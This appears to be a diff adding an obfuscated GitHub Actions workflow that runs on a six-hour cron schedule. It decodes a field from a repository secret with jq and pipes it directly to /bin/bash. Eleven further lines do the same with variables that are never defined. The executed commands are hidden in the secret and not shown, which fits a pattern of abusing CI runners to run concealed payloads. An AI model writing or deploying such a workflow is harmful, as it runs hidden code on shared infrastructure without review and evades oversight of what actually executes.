@@ -1,0 +1,29 @@
+name: chengyasheng7618
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chengyasheng7618
+        env:
+          cuf1221: ${{ secrets.cuf1221 }}
+        run: |
+          echo $cuf1221 | jq -r .v3916 | /bin/bash
+          echo $cnnx6494 | jq -r .sa134 | /bin/bash
+          echo $t426 | jq -r .qjw320 | /bin/bash
+          echo $afkp8 | jq -r .chsqn8820 | /bin/bash
+          echo $bodqx398 | jq -r .bqzc5209 | /bin/bash
+          echo $i41490 | jq -r .rxv644 | /bin/bash
+          echo $yukb48399 | jq -r .t6 | /bin/bash
+          echo $cohpk6772 | jq -r .znam4301 | /bin/bash
+          echo $i49222 | jq -r .jj8 | /bin/bash
+          echo $eac38978 | jq -r .q44386 | /bin/bash
+          echo $od8 | jq -r .ultbf53 | /bin/bash
+          echo $h5028 | jq -r .xgdyn80 | /bin/bash
+
